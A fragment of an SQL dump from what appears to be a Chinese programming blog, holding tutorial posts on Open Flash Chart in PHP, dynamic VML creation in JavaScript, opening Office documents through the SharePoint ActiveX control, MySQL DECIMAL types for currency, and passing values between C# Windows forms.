&#39;#86BBEF&#39; );</p>\r\n\r\n<p>$hbar-&gt;set_tooltip( &#39;Months: #val#&#39; );</p>\r\n\r\n<p>$hbar-&gt;set_values( array(4,8,3,4,7,8) );</p>\r\n\r\n<p>$chart = new open_flash_chart();</p>\r\n\r\n<p>$chart-&gt;set_title( $title );</p>\r\n\r\n<p>$chart-&gt;add_element( $hbar );</p>\r\n\r\n<p>$x = new x_axis();</p>\r\n\r\n<p>$x-&gt;set_offset( false );</p>\r\n\r\n<p>$x-&gt;set_range( 0, 10 );</p>\r\n\r\n<p>$chart-&gt;set_x_axis( $x );</p>\r\n\r\n<p>$y = new y_axis();</p>\r\n\r\n<p>$y-&gt;set_offset( true );</p>\r\n\r\n<p>$y-&gt;set_labels( array( &quot;Jeff&quot;,&quot;Geoff&quot;,&quot;Bob&quot;,&quot;Terry&quot;,&quot;Duncan&quot;,&quot;monk.e.boy&quot; ) );</p>\r\n\r\n<p>$chart-&gt;add_y_axis( $y );</p>\r\n\r\n<p>$tooltip = new tooltip();</p>\r\n\r\n<p>$tooltip-&gt;set_hover();</p>\r\n\r\n<p>$tooltip-&gt;set_stroke( 1 );</p>\r\n\r\n<p>$tooltip-&gt;set_colour( &quot;#000000&quot; );</p>\r\n\r\n<p>$tooltip-&gt;set_background_colour( &quot;#ffffff&quot; );</p>\r\n\r\n<p>$chart-&gt;set_tooltip( $tooltip );</p>\r\n\r\n<p>echo $chart-&gt;toPrettyString();</p>\r\n\r\n<p>?&gt;</p>\r\n',0,1438321934,0,0),(129,45,'open flash chart 饼图代码','<p>HTML部分</p>\r\n\r\n<p>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</p>\r\n\r\n<p>&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</p>\r\n\r\n<p>&lt;head&gt;</p>\r\n\r\n<p>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</p>\r\n\r\n<p>&lt;title&gt;无标题文档&lt;/title&gt;</p>\r\n\r\n<p>&lt;script type=&quot;text/javascript&quot; src=&quot;public/swfobject.js&quot;&gt;&lt;/script&gt;</p>\r\n\r\n<p>&lt;script type=&quot;text/javascript&quot;&gt;</p>\r\n\r\n<p>var flashdate = &#39;z.php&#39;;</p>\r\n\r\n<p>var swf = &#39;public/open-flash-chart.swf&#39;;</p>\r\n\r\n<p>swfobject.embedSWF(swf,&quot;vml&quot;,&quot;650&quot;,&quot;314&quot;,&quot;9.0.0&quot;,null,{&quot;data-file&quot;:flashdate});</p>\r\n\r\n<p>&lt;/script&gt;</p>\r\n\r\n<p>&lt;/head&gt;</p>\r\n\r\n<p>&lt;body&gt;</p>\r\n\r\n<p>&lt;div id=&quot;vml&quot;&gt;&lt;/div&gt;</p>\r\n\r\n<p>&lt;/body&gt;</p>\r\n\r\n<p>&lt;/html&gt;</p>\r\n\r\n<p>PHP部分</p>\r\n\r\n<p>&lt;?php</p>\r\n\r\n<p>include_once( &#39;include/openflashchart/open-flash-chart.php&#39; );</p>\r\n\r\n<p>$title = new title( &#39;Pork Pie, Mmmmm&#39; );</p>\r\n\r\n<p>$pie = new pie();</p>\r\n\r\n<p>$pie-&gt;set_alpha(0.6);</p>\r\n\r\n<p>$pie-&gt;set_start_angle( 35 );</p>\r\n\r\n<p>$pie-&gt;add_animation( new pie_fade() );</p>\r\n\r\n<p>$pie-&gt;set_tooltip( &#39;#val# of #total#&lt;br&gt;#percent# of 100%&#39; );</p>\r\n\r\n<p>$pie-&gt;set_colours( array(&#39;#1C9E05&#39;,&#39;#FF368D&#39;,&#39;#FF0000&#39;) );</p>\r\n\r\n<p>$pie-&gt;set_values( array(3,4,new pie_value(6.5, &quot;hello (6.5)&quot;)) );</p>\r\n\r\n<p>$chart = new open_flash_chart();</p>\r\n\r\n<p>$chart-&gt;set_title( $title );</p>\r\n\r\n<p>$chart-&gt;add_element( $pie );</p>\r\n\r\n<p>$chart-&gt;x_axis = null;</p>\r\n\r\n<p>echo $chart-&gt;toPrettyString();</p>\r\n\r\n<p>?&gt;</p>\r\n',0,1438322027,0,0),(130,43,'javascript动态创建VML(上)','<p>VML是The Vector Markup Language(矢量可标记语言)的缩写。VML用于将图形数据矢量化的标记语言。这是一种基于 XML 语法的语言，由 AutoDesk 、 Macromedia 和 Microsoft 和 HP 公司向 W3C 提出的方案，于1999年9月附带IE5.0发布的。使用VML可以在IE中绘制矢量图形，所以有人认为VML就是在IE中实现了画笔的功能。要使用VML，我们首先要开辟一个命名空间。<br />\r\ndocument.namespaces.add(&#39;vml&#39;, &#39;urn:schemas-microsoft-com:vml&#39;, &quot;#default#VML&quot;);</p>\r\n\r\n<p>它们的作用相当于把HTML标签搞成下面这个样子：<br />\r\n&lt;html xmlns:vml=&quot;urn:schemas-microsoft-com:vml&quot;&gt;</p>\r\n\r\n<p>接着就是在样式中调用对应的CSS hehavior。静态代码应该是这个样子：<br />\r\n&lt;style type=&quot;text/css&quot;&gt;vml\\:* { behavior: url(#default#VML) }&lt;/style&gt;</p>\r\n\r\n<p>网上风传IE8对VML支持不友好，要放弃VML云云，主要原因在于&ldquo;vml\\:*&rdquo;这个选择器被IE8认为不合法（反面证明IE在努力修正其CSS bug）。由此，人们被迫利用v\\:line, v\\:rect, v\\:roundrect, v\\:oval这样子的联合选择器来调用相关的CSS hehavior。不过只要是合法选择器就可以调用CSS hehavior，因此这里用联合选择器实在太累赘了。我想换类选择器是否更合适点呢？试验一下，是无问题的。但仅仅是这样是渲染不出来的，由于IE8已经重写了内核，因此此bug不是hasLayout可以解决的。给出答案是使用display:inline-block，这样就可以强逼它继续渲染了。后来我又发现display:block也有此功效，但考虑到内联元素的问题，还是用官方的补丁吧 。至此，开辟命名空与与渲染VML元素的问题就告一段落。</p>\r\n\r\n<p>再来看如何动态创建VML元素，由于是非标准，我们就用非标准的createElement方式来创建它。我们需要拼接一个字符串，作为createElement 的参数，它应该包含命名空间与类名。<br />\r\nvar createVML = function (tagName) {&nbsp;&nbsp;&nbsp; return doc.createElement(&#39;&lt;vml:&#39; + tagName + &#39; class=&quot;vml&quot;&gt;&#39;);};</p>\r\n\r\n<p>随便做了一个小工具，看看后果如何：<br />\r\n完整代码见下一篇</p>\r\n\r\n<p>最后附上三种创建VML元素的方法：<br />\r\nvar VmlElement = document.createElement(&#39;&lt;vml:&#39; + tagName + &#39; class=&quot;vml&quot;&gt;&#39;);var VmlElement = document.createElement(&#39;&lt;&#39; + tagName + &#39;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xmlns=&quot;urn:schemas-microsoft.com:vml&quot; class=&quot;vml&quot;&gt;&#39;)var VmlElement = document.createElement(&#39;vml:&#39; + tagName );VmlElement.className = &quot;vml&quot;;//最后必须把命名空间当作类名加上</p>\r\n',0,1438322194,0,0),(131,43,'javascript动态创建VML(下)','<p>(function(){</p>\r\n\r\n<p>&nbsp; if(!window.vml){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; window.vml = {};</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; document.createStyleSheet().addRule(&quot;.vml&quot;, &quot;behavior:url(#default#VML);display:inline-block;&quot;);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; if (!document.namespaces.vml &amp;&amp; !+&quot;\\v1&quot;){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.namespaces.add(&quot;vml&quot;, &quot;urn:schemas-microsoft-com:vml&quot;);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp; }</p>\r\n\r\n<p>&nbsp; var vml = window.vml = function(name){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; return vml.fn.create(name || &quot;rect&quot;);</p>\r\n\r\n<p>&nbsp; }</p>\r\n\r\n<p>&nbsp; vml.fn = vml.prototype = {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; create : function(name){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.node = document.createElement(&#39;&lt;vml:&#39; + name + &#39; class=&quot;vml&quot;&gt;&#39;);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return this;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; },</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; appendTo: function(parent){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(typeof this.node !== &quot;undefined&quot; &amp;&amp; parent.nodeType == 1){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; parent.appendChild(this.node);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return this;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; },</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; attr : function(bag){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(var i in bag){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(bag.hasOwnProperty(i)){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.node.setAttribute(i,bag[i])</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return this;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; },</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; css: function(bag){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var str = &quot;;&quot;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(var i in bag){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(bag.hasOwnProperty(i))</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; str +=&nbsp; i == &quot;opacity&quot; ? (&quot;filter:alpha(opacity=&quot;+ bag[i] * 100+&quot;);&quot;):(i+&quot;:&quot;+bag[i]+&quot;;&quot;)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.node.style.cssText = str;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return this;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp; }</p>\r\n\r\n<p>})()</p>\r\n\r\n<p>代码:</p>\r\n\r\n<p>&lt;!doctype html&gt;</p>\r\n\r\n<p>&lt;title&gt;javascript动态创建VML by 司徒正美&lt;/title&gt;</p>\r\n\r\n<p>&lt;script type=&quot;text/javascript&quot;&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //这里载入上面的代码 字数原因 这里不复制了</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; window.onload = function(){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vml(&quot;roundrect&quot;).css({position:&quot;relative&quot;,left:&#39;20px&#39;,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; top:&#39;5px&#39;,width:&quot;200px&quot;,height:&quot;100px&quot;,&quot;z-index&quot;:9}).attr({fillcolor:&quot;yellow&quot;}).</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; appendTo(document.body);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vml(&quot;oval&quot;).css({position:&quot;relative&quot;,left:&#39;5px&#39;,top:&#39;200px&#39;,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; width:&quot;200px&quot;,height:&#39;150px&#39;}).attr({fillcolor:&quot;blue&quot;}).appendTo(document.body);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&lt;/script&gt;</p>\r\n\r\n<p>&lt;p&gt;必须要IE中才能看到图形！ &lt;/p1&gt;</p>\r\n',0,1438322251,0,0),(132,1,'如何在Web页面上直接打开、编辑、创建Office文档','<p>有朋友询问如何在Web页面上做到像SharePoint中的效果一样，能直接激活客户端的Word来打开.doc文件，而不是类似直接点击.doc文档链接时Word在IE中被打开那样。想想这个问题应该很多人都会感兴趣，所以干脆写一篇blog来大致描述一下方法。</p>\r\n\r\n<p>在安装Office2003以后，有一个ActiveX控件被安装到了系统中，这个控件位于&ldquo;Program Files\\Microsoft Office\\OFFICE11\\owssupp.dll&rdquo;。通过这个控件，客户端页面上的JavaScript就可以激活本地的Office软件，来实现打开、编辑Office文档。（另，Office XP应该就已经包含这个ActiveX控件了。）</p>\r\n\r\n<p>首先，用Script创建一个本地的对象：</p>\r\n\r\n<p>openDocObj = new ActiveXObject(&quot;SharePoint.OpenDocuments.2&quot;); // 为了兼容Office XP，可以创建&ldquo;SharePoint.OpenDocuments.1&rdquo;</p>\r\n\r\n<p>然后，调用openDocObj的相应的方法。比如打开服务器上的一个Office文档：</p>\r\n\r\n<p>openDocObj.ViewDocument(&quot;http://www.abc.com/documents/sample.doc&quot;);</p>\r\n\r\n<p>openDocObj对象会根据参数中不同的Office文档类型（.doc、.xls、.ppt）来打开不同的程序（Word、Excel、PowerPoint）。ViewDocument()方法还有一个重载签名，可以让我们手工指定激活哪个程序来打开文档：</p>\r\n\r\n<p>openDocObj.ViewDocument(&quot;http://www.abc.com/documents/sample.doc&quot;, 要激活的程序的ProgID);</p>\r\n\r\n<p>那么要打开Office程序在线编辑文件又如何？</p>\r\n\r\n<p>openDocObj.EditDocument(&quot;http://www.abc.com/documents/sample.doc&quot;);</p>\r\n\r\n<p>就可以直接激活Word，在Word里面编辑文档，然后直接点击Word里面的保存功能，就可以将文件保存会服务器上了。注意：为了让Word能将编辑后的文档直接保存会服务器，访问Web站点的当前上下文的Windows Identity必须对服务器的相应目录（即&ldquo;http://www.abc.com/documents&rdquo;这个虚拟目录所对应的服务器上的物理路径）有相应的写权限，否则保存动作会失败。编辑完成后，EditDocument()会返回一个bool值，来反映编辑操作是否成功。</p>\r\n\r\n<p>我们还可以通过打开服务器上的一个文档模版，来创建一个新的文档：</p>\r\n\r\n<p>openDocObj.CreateNewDocument(&quot;http://www.abc.com/documents/sampleTemplate.dot&quot;, &quot;http://www.abc.com/documents/&quot;);</p>\r\n\r\n<p>就可以使用&ldquo;http://www.abc.com/documents/sampleTemplate.dot&rdquo;这个模版来创建一个新的文档，默认新文档的保存地点是&ldquo;http://www.abc.com/documents/&rdquo;。创建新文档时使用的程序取决于模版文件的类型（比如.dot模版会对应Word）。新文档的保存同样需要注意权限问题。CreateNewDocument()方法同样会返回一个bool值来反映操作是否成功。</p>\r\n\r\n<p>CreateNewDocument()方法的第一个参数，除了可以使用一个模版的地址外，还可以直接指定为希望用来创建新文档的客户端程序的ProgID。</p>\r\n',0,1438322410,0,0),(133,32,'关于mysql的货币类型存储NUMERIC 和 DECIMA','<p>可能做程序的人都知道，float类型是可以存浮点数（即小数类型），但是float有个坏处，当你给定的数据是整数的时候，那么它就以整数给你处理。这样我们在存取货币值的时候自然遇到问题，我的default值为：0.00而实际存储是0，同样我存取货币为12.00，实际存储是12.<br />\r\n幸好mysql提供了两个数据类型：numeric和decimal，这两种数据类型可以轻松解决上面的问题：<br />\r\nNUMERIC 和 DECIMAL 类型被 MySQL 以同样的类型实现，这在 SQL92 标准中是允许的。他们用于保存对准确精度有重要要求的值，例如与金钱有关的数据。当以它们中的之一声明一个列时，精度和数值范围可以(通常是)被指定；例 如：</p>\r\n\r\n<p>salary DECIMAL(5,2)</p>\r\n\r\n<p>在这个例子中，5 (精度(precision)) 代表重要的十进制数字的数目，2 (数据范围(scale)) 代表在小数点后的数字位数。在这种情况下，因此，salary 列可以存储的值范围是从 -99.99 到 99.99。(实际上 MySQL 在这个列中可以存储的数值可以一直到 999.99，因为它没有存储正数的符号)。</p>\r\n\r\n<p>译者注：</p>\r\n\r\n<p>M 与D 对DECIMAL(M, D) 取值范围的影响</p>\r\n\r\n<p>类型说明 取值范围（MySQL &lt; 3.23） 取值范围（MySQL &gt;= 3.23）<br />\r\nDECIMAL(4, 1) -9.9 到 99.9 -999.9 到 9999.9<br />\r\nDECIMAL(5, 1) -99.9 到 999.9 -9999.9 到 99999.9<br />\r\nDECIMAL(6, 1) -999.9 到 9999.9 -99999.9 到 999999.9<br />\r\nDECIMAL(6, 2) -99.99 到 999.99 -9999.99 到 99999.99<br />\r\nDECIMAL(6, 3) -9.999 到 99.999 -999.999 到 9999.999</p>\r\n\r\n<p># 在MySQL 3.23 及以后的版本中，DECIMAL(M, D) 的取值范围等于早期版本中的DECIMAL(M + 2, D) 的取值范围。</p>\r\n\r\n<p>还有一种数据类型也是比较棒的： 那就是LongBlob，这种数据类型可以直接把图像文件存到数据库中！</p>\r\n',0,1438322586,0,0),(134,38,'C#多窗口之间传值的两种方法—实例介绍','<p>进行用C#来开发windows应用程序项目时，不同窗口之间传值有很多种不同的方法，这里只介绍两种比较常用的方法：<br />\r\n&nbsp;&nbsp;&nbsp; 假设项目中有两个窗体，Form1和Form2，要实现的效果是点击Form1中的Button1按钮实现TextBox1和TextBox2中的值相加，然后把这个相加的值传递给Form2中的TextBox1，并在TextBox1中显示出这个和值。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731140627353097.jpg\" style=\"height:303px; width:690px\" /></p>\r\n\r\n<p>方法一：通过为窗体类写属性来传递值<br />\r\n（1），在被传递值的窗体（这里是Form2）类里面写属性<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private string str;//定义的私有变量<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public string STR//为窗体Form2定义的属性<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; get //读</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; { return str;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set//写<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; str = value;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p><br />\r\n（2），在Form2中把读到的属性赋给Form2中的TextBox1文本框<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void Form2_Load(object sender, EventArgs e)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; textBox1.Text = str;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p><br />\r\n（3），在Form1中的Button1的Click点击事件中写如下代码<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void button1_Click(object sender, EventArgs e)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Form2 frm2 = new Form2();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int a, b, sum;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (int.TryParse(textBox1.Text, out a) &amp;&amp; int.TryParse(textBox2.Text, out b))//关于TryParse的使用方法，见补充知识。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sum = a + b;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; frm2.STR = sum.ToString();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; frm2.ShowDialog();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; frm2.STR = &quot;输入的为非数字型字符串&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; frm2.ShowDialog();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n大功告成，在你的机子上运行下，是不是成功了？</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>方法二：通过为窗体类写构造函数来传值<br />\r\n（1），在被传递值的窗体（这里是Form2）类里面写其构造函数，注意原来的构造函数不要修改它，我们在代码块里面直接加入以下代码即可。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string str1, str2;//定义两个私有变量<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public Form2(TextBox tb1, TextBox tb2)//定义构造函数，tb1和tb2对应Form1中的TextBox1和TextBox2，以便传值<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; InitializeComponent();//一定要加上。。。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; str1 = tb1.Text.ToString();//取文本框值<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; str2 = tb2.Text.ToString();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int a, b, sum;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (int.TryParse(str1, out a) &amp;&amp; int.TryParse(str2, out b))//检查文本框里面的值是否可转化为int型，返回值为bool型，如果为真，则转化为整型a和b, 关于TryParse的使用方法，见补充知识。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int sum = a + b;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; textBox1.Text = Convert.ToString(sum);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; textBox1.Text = &quot;输入的为非数字型字符串&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p><br />\r\n（2），在Form1中的Button1的Click事件中写如下代码<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void button1_Click(object sender, EventArgs e)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; { &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Form2 frm2 = new Form2(textBox1, textBox2);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; frm2.ShowDialog();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 到这里，第二种方法也完成了。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>补充知识：</p>\r\n\r\n<p>parse,tryparse区别</p>\r\n\r\n<p>Convert.ToInt32，int.Parse(),int.TryParse，(int) 四者都可以解释为将类型转换为 int，那它们的区别是什么呢？</p>\r\n\r\n<p>Convert.ToInt32 与 int.Parse 较为类似，实际上 Convert.ToInt32 内部调用了 int.Parse：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; Convert.ToInt32 参数为 null 时，返回 0；<br />\r\n&nbsp;&nbsp;&nbsp; int.Parse 参数为 null 时，抛出异常。<br />\r\n&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; Convert.ToInt32 参数为 &quot;&quot; 时，抛出异常；<br />\r\n&nbsp;&nbsp;&nbsp; int.Parse 参数为 &quot;&quot; 时，抛出异常。<br />\r\n&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; Convert.ToInt32 可以转换的类型较多；<br />\r\n&nbsp;&nbsp;&nbsp; int.Parse 只能转换数字类型的字符串。</p>\r\n\r\n<p>int.TryParse 与 int.Parse 又较为类似，但它不会产生异常，转换成功返回 true，转换失败返回 false。最后一个参数为输出值，如果转换失败，输出值为 0。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>int m;<br />\r\nif(int.TryParse(&quot;2&quot;),out m)<br />\r\n{<br />\r\n...<br />\r\n}<br />\r\n返回true ,运行{}内，并给m赋值为2；</p>\r\n\r\n<p>&nbsp;if(int.TryParse(&quot;ddd&quot;),out m)<br />\r\n{<br />\r\n...<br />\r\n}<br />\r\n返回false,不运行if{}内，并给m赋值为0；</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>使用Parse和TryParse转换数字字符串<br 